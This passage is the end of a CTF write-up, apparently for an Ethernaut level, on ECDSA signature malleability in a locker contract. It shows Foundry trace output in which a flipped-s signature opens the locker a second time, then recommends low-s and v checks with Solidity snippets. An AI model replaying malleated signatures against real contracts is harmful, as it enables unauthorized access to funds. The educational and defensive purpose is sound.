<span class="pi">[</span><span class="nv">PASS</span><span class="pi">]</span> <span class="na">testSignatureMalleability() (gas</span><span class="pi">:</span> <span class="s">88082)</span>
<span class="na">Traces</span><span class="pi">:</span>
  <span class="pi">[</span><span class="nv">88082</span><span class="pi">]</span> <span class="s">ECLockerTest::testSignatureMalleability()</span>
    <span class="s">‚îú‚îÄ [5140] Impersonator::lockers(0) [staticcall]</span>
    <span class="s">‚îÇ   ‚îî‚îÄ ‚Üê [Return] ECLocker</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x104fBc016F4bb334D775a19E8A6510109AC63E00</span><span class="pi">]</span>
    <span class="s">‚îú‚îÄ [0] VM::sign("&lt;pk&gt;", 0xc9798da569c6ded6bd4b17373ef332b7c84d68cdec3f420f583dcd7b441ae31d) [staticcall]</span>
    <span class="s">‚îÇ   ‚îî‚îÄ ‚Üê [Return] 28, 0x803c3d50f6c6045271cffbbfa6321ffca565acf7e929e7c414a32ea755347241, 0x7c93e8acd34551d042421ba504a4e96c0e216884681a0e52f65e770894342c90</span>
    <span class="s">‚îú‚îÄ [0] VM::prank(0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7)</span>
    <span class="s">‚îÇ   ‚îî‚îÄ ‚Üê [Return]</span>
    <span class="s">‚îú‚îÄ [31965] ECLocker::open(28, 0x803c3d50f6c6045271cffbbfa6321ffca565acf7e929e7c414a32ea755347241, 0x7c93e8acd34551d042421ba504a4e96c0e216884681a0e52f65e770894342c90)</span>
    <span class="s">‚îÇ   ‚îú‚îÄ [3000] PRECOMPILES::ecrecover(0xc9798da569c6ded6bd4b17373ef332b7c84d68cdec3f420f583dcd7b441ae31d, 28, 58002478631855971539320367201591076334196138846330609933668613418806804771393, 56348125607360146780372420456742903897957838190118489022110830123524616891536) [staticcall]</span>
    <span class="s">‚îÇ   ‚îÇ   ‚îî‚îÄ ‚Üê [Return] 0x000000000000000000000000e05fcc23807536bee418f142d19fa0d21bb0cff7</span>
    <span class="s">‚îÇ   ‚îú‚îÄ emit Open(opener</span><span class="err">:</span> <span class="s">0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7, timestamp</span><span class="err">:</span> <span class="s">1)</span>
    <span class="s">‚îÇ   ‚îî‚îÄ ‚Üê [Stop]</span>
    <span class="s">‚îú‚îÄ [0] VM::prank(0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7)</span>
    <span class="s">‚îÇ   ‚îî‚îÄ ‚Üê [Return]</span>
    <span class="s">‚îú‚îÄ [29965] ECLocker::open(27, 0x803c3d50f6c6045271cffbbfa6321ffca565acf7e929e7c414a32ea755347241, 0x836c17532cbaae2fbdbde45afb5b1692ac8d7462472e91e8c973e7843c0214b1)</span>
    <span class="s">‚îÇ   ‚îú‚îÄ [3000] PRECOMPILES::ecrecover(0xc9798da569c6ded6bd4b17373ef332b7c84d68cdec3f420f583dcd7b441ae31d, 27, 58002478631855971539320367201591076334196138846330609933668613418806804771393, 59443963629956048643198564551945003954879726088956415360494333017993544602801) [staticcall]</span>
    <span class="s">‚îÇ   ‚îÇ   ‚îî‚îÄ ‚Üê [Return] 0x000000000000000000000000e05fcc23807536bee418f142d19fa0d21bb0cff7</span>
    <span class="s">‚îÇ   ‚îú‚îÄ emit Open(opener</span><span class="err">:</span> <span class="s">0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7, timestamp</span><span class="err">:</span> <span class="s">1)</span>
    <span class="s">‚îÇ   ‚îî‚îÄ ‚Üê [Stop]</span>
    <span class="s">‚îî‚îÄ ‚Üê [Stop]</span>

<span class="na">Suite result</span><span class="pi">:</span> <span class="s">ok. 1 passed; 0 failed; 0 skipped; finished in 4.77ms (1.80ms CPU time)</span>

<span class="na">Ran 1 test suite in 15.17ms (4.77ms CPU time)</span><span class="pi">:</span> <span class="s">1 tests passed, 0 failed, 0 skipped (1 total tests)</span>
<span class="s">nithin@ScateR:~/SCATERLABs/CTFs/EthernautChallenges$</span> 
</code></pre></div></div>

<h3 id="recommendation-">Recommendation :</h3>
<p>Add a check to ensure the signature‚Äôs s value is in the lower half order of the curve.</p>
<pre><code class="language-solidity">require(
    uint256(s) &lt;= 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0,
    "Invalid s value"
);

</code></pre>
<p>Also ensure v is either 27 or 28:</p>
<pre><code class="language-solidity">require(v == 27 || v == 28, "Invalid v value");

</code></pre>
<p>This ensures all accepted signatures are in canonical form, which eliminates malleability.</p>

<p><strong>THANK YOU</strong></p>


  </div><a class="u-url" href="/writeups/2025/04/25/Ethernaut.html" hidden></a>
</article>

    </main>

    <script>
        document.addEventListener('DOMContentLoaded', function () {
            // Copy button functionality for code blocks
            const preBlocks = document.querySelectorAll('pre');
            preBlocks.forEach(pre => {
                if (pre.parentNode.classList.contains('code-container')) return; // Avoid re-wrapping
                const container = document.createElement('div');
                container.className = 'code-container';
                const copyButton = document.createElement('button');
                copyButton.className = 'copy-button';
                copyButton.textContent = 'Copy';
                pre.parentNode.insertBefore(container, pre);
                container.appendChild(pre);
                container.appendChild(copyButton);
                copyButton.addEventListener('click', () => {
                    const code = pre.querySelector('code').innerText;
                    navigator.clipboard.writeText(code).then(() => {
                        copyButton.textContent = 'Copied!';
                        setTimeout(() => {
                            copyButton.textContent = 'Copy';
                        }, 2000);
                    }).catch(err => {
                        console.error('Failed to copy: ', err);
                    });
                });
            });

            // Mobile menu toggle functionality
            const menuToggle = document.getElementById('menuToggle');
            const mainNav = document.getElementById('mainNav');

            if (menuToggle && mainNav) {
                menuToggle.addEventListener('click', function () {
                    mainNav.classList.toggle('active');
                    menuToggle.classList.toggle('active');
                });

                // Close menu when clicking on a link
                const navLinks = mainNav.querySelectorAll('a');
                navLinks.forEach(link => {
                    link.addEventListener('click', () => {
                        mainNav.classList.remove('active');
                        menuToggle.classList.remove('active');
                    });
                });

                // Close menu when clicking outside
                document.addEventListener('click', function (event) {
                    const isClickInsideNav = mainNav.contains(event.target);
                    const isClickOnToggle = menuToggle.contains(event.target);

                    if (!isClickInsideNav && !isClickOnToggle && mainNav.classList.contains('active')) {
                        mainNav.classList.remove('active');
                        menuToggle.classList.remove('active');
                    }
                });
            }
        });
    </script>
</body>

</html>